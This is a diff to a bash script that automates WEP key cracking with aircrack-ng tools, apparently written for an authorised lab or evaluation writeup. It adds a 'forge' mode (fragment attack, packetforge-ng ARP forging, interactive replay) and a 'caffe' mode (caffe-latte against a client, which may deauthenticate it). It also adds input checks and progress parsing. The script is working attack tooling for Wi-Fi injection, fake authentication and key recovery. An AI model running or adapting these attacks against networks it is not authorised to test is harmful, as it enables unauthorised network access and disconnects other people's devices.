@@ -13,10 +13,18 @@
 #   passive mode: monitor + capture only. Works on any card that can monitor
 #                 (e.g. the Intel AC8260). Good for practice and for the analysis
 #                 half of the writeup.
+#   forge   mode: active, with a forged ARP request. aireplay-ng --fragment takes a keystream from a
+#                 data packet the AP sends (up to 120 s), packetforge-ng builds an ARP request from
+#                 it, and aireplay-ng --interactive replays that. Use it when the network sends no
+#                 ARP request of its own for active mode to copy.
+#   caffe   mode: active, with aireplay-ng --caffe-latte against the one client given with -C. That
+#                 client may be deauthenticated, so give only a device you may disconnect: your own phone
+#                 on GL, or a client of the evaluation network inside the window.
 #
 # Usage:
-#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
-#   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
+#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m MODE] [-C <CLIENT_MAC>] [-o prefix] [-t N] [-x pps]
+#   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m MODE] [-C <CLIENT_MAC>] [-o prefix] [-t N] [-x pps]
+#   MODE is active, passive, forge or caffe. -C is required for caffe and refused by the other modes.
 #
 # Example:
 #   sudo ./scripts/wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
@@ -26,7 +34,7 @@
 # channel, so the card must already be on -c. The monitor stays up when this run exits, and the run
 # that started it stops it. Give -i or -M, not both.
 #
-# -x <pps> caps the ARP replay at that many packets a second (aireplay-ng -x). Unset, the replay runs
+# -x <pps> caps the replay at that many packets a second (aireplay-ng -x). Unset, the replay runs
 # uncapped. The progress lines count the Wi-Fi card's firmware restarts (FW resets) since this run started.
 #
 # Monitor mode, the capture and the WiFi recovery come from wifi-lib.sh, the same
@@ -55,9 +63,11 @@ MIN_IVS=40000            # first attempt here: PTW breaks half of 104-bit keys u
 RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)
 STALL_SECS=60            # warn when no ARP ACK arrives for this long (active mode)
 MAX_FAKEAUTH_FAILS=3     # fake-auth relaunches in a row that never associate before the run stops
-RATE_CAP=""              # -x: ARP replay packets per second. Empty = uncapped
+RATE_CAP=""              # -x: replay packets per second (active, forge, caffe). Empty = uncapped
+CLIENT=""                # -C: the connected client that caffe mode deauthenticates and answers from
+FRAG_LIMIT=120           # forge: seconds the fragment attack may wait for a data packet from the AP
 
-while getopts ":i:M:b:c:e:m:o:t:x:h" opt; do
+while getopts ":i:M:b:c:e:m:o:t:x:C:h" opt; do
   case "$opt" in
     i) IFACE="$OPTARG" ;;
     M) MONIFACE="$OPTARG" ;;
@@ -68,16 +78,20 @@ while getopts ":i:M:b:c:e:m:o:t:x:h" opt; do
     o) PREFIX="$OPTARG" ;;
     t) IV_TARGET="$OPTARG" ;;
     x) RATE_CAP="$OPTARG" ;;
+    C) CLIENT="$OPTARG" ;;
     h) usage 0 ;;
     *) usage ;;
   esac
 done
 
 # ---- preflight ------------------------------------------------------------
-wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemctl tshark gawk
+wifi_preflight airmon-ng airodump-ng aireplay-ng packetforge-ng aircrack-ng iw ip nmcli systemctl tshark gawk
 [[ -n "$IFACE$MONIFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
 [[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
-[[ "$MODE" == "active" || "$MODE" == "passive" ]] || die "-m must be active|passive. For a monitor that is already up, use -M."
+[[ "$MODE" =~ ^(active|passive|forge|caffe)$ ]] || die "-m must be active, passive, forge or caffe. For a monitor that is already up, use -M."
+[[ -z "$CLIENT" || "$CLIENT" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || die "-C must be a MAC address such as 11:22:33:44:55:66"
+[[ "$MODE" != caffe || -n "$CLIENT" ]] || die "-m caffe needs -C <client MAC>: a device connected to the AP, such as your phone."
+[[ -z "$CLIENT" || "$MODE" == caffe ]] || die "-C is only used by -m caffe."
 [[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
 [[ -z "$RATE_CAP" || "$RATE_CAP" =~ ^[1-9][0-9]*$ ]] || die "-x must be a positive number of packets per second"
 if [[ -n "$MONIFACE" ]]; then
@@ -124,7 +138,7 @@ REPORT_BSSID="$BSSID"
 sleep 4
 
 # ---- active injection -----------------------------------------------------
-if [[ "$MODE" == "active" ]]; then
+if [[ "$MODE" != passive ]]; then
   MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
   echo "[*] Verifying injection against the target $BSSID..."
   if inject_test "$MON" "${OUT}-injection.txt" "$BSSID" >/dev/null; then
@@ -132,7 +146,7 @@ if [[ "$MODE" == "active" ]]; then
   else
     echo "[!] Injection test did NOT pass: $BSSID did not answer on $IFACE."
     echo "    Replies per AP are in ${OUT}-injection.txt. Falling back to PASSIVE capture."
-    echo "    Active mode needs a card that injects against this AP."
+    echo "    $MODE mode needs a card that injects against this AP."
     MODE="passive"
   fi
 fi
@@ -172,18 +186,82 @@ check_fakeauth() {
   start_fakeauth
 }
 
-if [[ "$MODE" == "active" ]]; then
+# forge and caffe send frames only once the fake station is associated: the AP drops frames from a
+# station that is not.
+wait_for_association() {
+  local i
+  for i in $(seq 20); do
+    grep -q 'Association successful' "${OUT}-fakeauth.txt" 2>/dev/null && return 0
+    sleep 1
+  done
+  die "The fake station did not associate within 20 s, so the attack was not started. See ${OUT}-fakeauth.txt"
+}
+
+# forge, step 1: aireplay-ng --fragment saves a keystream (fragment-*.xor) from one data packet the AP
+# sends. -F takes the first packet that fits, so nothing waits for a keypress. stdin is /dev/null.
+forge_keystream() {
+  echo "[*] Fragment attack: waiting up to ${FRAG_LIMIT} s for a data packet from $BSSID..."
+  ( cd "$RUNDIR" && exec timeout -k 5 "$FRAG_LIMIT" aireplay-ng --ignore-negative-one --fragment -F -b "$BSSID" -h "$MYMAC" "$MON" ) \
+    >"${OUT}-fragment.txt" 2>&1 </dev/null &
+  frag_pid=$!
+  track_pid "$frag_pid"
+  wait "$frag_pid"
+  KEYSTREAM=$(ls -t "$RUNDIR"/fragment-*.xor 2>/dev/null | head -n 1)
+  [[ -n "$KEYSTREAM" ]] || die "No keystream from the fragment attack (it ran up to ${FRAG_LIMIT} s). See ${OUT}-fragment.txt. A download on a client gives the AP data to send (COMMANDS.md section 9)."
+  echo "[*] Keystream saved to $KEYSTREAM"
+}
+
+# forge, step 2: packetforge-ng builds an ARP request from that keystream. Its IPs are the broadcast
+# address, which no host owns, so no client's ARP cache takes our MAC for a real address.
+forge_arp() {
+  FORGED="$RUNDIR/forged-arp.cap"
+  packetforge-ng -0 -a "$BSSID" -h "$MYMAC" -c FF:FF:FF:FF:FF:FF -k 255.255.255.255 -l 255.255.255.255 \
+    -y "$KEYSTREAM" -w "$FORGED" >"${OUT}-forge.txt" 2>&1
+  grep -q 'Wrote packet' "${OUT}-forge.txt" || die "packetforge-ng wrote no ARP request. See ${OUT}-forge.txt"
+  echo "[*] ARP request forged from the keystream: $FORGED"
+}
+
+# Replay output: active keeps its arpreplay file name. The other modes write -replay.txt.
+REPLAY_OUT="${OUT}-replay.txt"
+if [[ "$MODE" != passive ]]; then
   echo "[*] Associating with AP (fake auth)..."
   start_fakeauth
-  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
-  [[ -n "$RATE_CAP" ]] && echo "[*] ARP replay capped at ${RATE_CAP} packets per second (-x)."
-  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
-    >"${OUT}-arpreplay.txt" 2>&1 &
-  arp_pid=$!
-  track_pid "$arp_pid"
-else
-  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
 fi
+case "$MODE" in
+  active)
+    REPLAY_OUT="${OUT}-arpreplay.txt"
+    echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
+    [[ -n "$RATE_CAP" ]] && echo "[*] ARP replay capped at ${RATE_CAP} packets per second (-x)."
+    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
+      >"$REPLAY_OUT" 2>&1 &
+    replay_pid=$!
+    track_pid "$replay_pid"
+    ;;
+  forge)
+    wait_for_association
+    forge_keystream
+    forge_arp
+    echo "[*] Replaying the forged ARP request to pump IVs..."
+    [[ -n "$RATE_CAP" ]] && echo "[*] Replay capped at ${RATE_CAP} packets per second (-x)."
+    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --interactive -F -r "$FORGED" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
+      >"$REPLAY_OUT" 2>&1 &
+    replay_pid=$!
+    track_pid "$replay_pid"
+    ;;
+  caffe)
+    wait_for_association
+    echo "[*] Caffe-latte against client $CLIENT: it may deauthenticate that client, so it can drop and reconnect."
+    # -b filters the capture to the AP and -a sets the AP for the attack (aireplay-ng --help). Both are
+    # given until a test shows which one caffe-latte reads.
+    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --caffe-latte -a "$BSSID" -b "$BSSID" -c "$CLIENT" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
+      >"$REPLAY_OUT" 2>&1 &
+    replay_pid=$!
+    track_pid "$replay_pid"
+    ;;
+  passive)
+    echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
+    ;;
+esac
 
 # ---- crack loop -----------------------------------------------------------
 echo "[*] IVs: captured IVs. IV/s: new IVs per second. ARP req: ARP requests captured for replay."
@@ -200,9 +278,18 @@ ap_ivs() {
 # ACKs from the last ARP replay status line; 0 until the first.
 arp_acks() {
   local n
-  n=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
+  n=$(tail -c 4096 "$REPLAY_OUT" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
     sed -nE 's/.*ARP requests and ([0-9]+) ACKs.*/\1/p')
   echo "${n:-0}"
+}
+
+# The last replay status line: "ARP req N, ACK M, TX K" for the two formats that count ARPs and ACKs,
+# or "TX K" for the format that counts packets sent. Empty until the first line.
+replay_status() {
+  tail -c 4096 "$REPLAY_OUT" 2>/dev/null | tr '\r' '\n' | grep -a -E '[Ss]ent [0-9]+ packets' | tail -n 1 |
+    sed -nE -e 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/p' \
+      -e 's/.*\(([0-9]+) ARPs, ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/p' \
+      -e 's/.*Sent ([0-9]+) packets.*/TX \1/p'
 }
 
 # Firmware restarts of the Wi-Fi card since this run started. The kernel logs one "Microcode SW error" per restart.
@@ -260,15 +347,14 @@ while true; do
   sleep "$RETRY_SECS"
   # A card reset or a stopped attack would otherwise leave the count frozen, so stop with the reason.
   iw dev "$MON" info >/dev/null 2>&1 || die "$MON is gone: the card reset, or whatever started the monitor stopped it (see: sudo dmesg | tail -n 30)."
-  if [[ "$MODE" == "active" ]]; then
-    kill -0 "$arp_pid" 2>/dev/null || die "ARP replay stopped; see ${OUT}-arpreplay.txt"
+  if [[ "$MODE" != passive ]]; then
+    kill -0 "$replay_pid" 2>/dev/null || die "Replay stopped; see $REPLAY_OUT"
     check_fakeauth
   fi
   ivs=$(ap_ivs)
   acks=$(arp_acks)
-  # Latest ARP replay counters, from the last status line aireplay-ng printed.
-  replay=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
-    sed -E 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/')
+  # Latest replay counters, from the last status line aireplay-ng printed.
+  replay=$(replay_status)
   # The rate is per real second: a slow aircrack try can make the loop take longer than RETRY_SECS.
   now=$(date +%s.%N)
   rate=$(awk -v d="$((ivs - prev_iv))" -v a="$prev_time" -v b="$now" 'BEGIN { t = b - a; printf "%+d", (t > 0 ? d / t : 0) }')
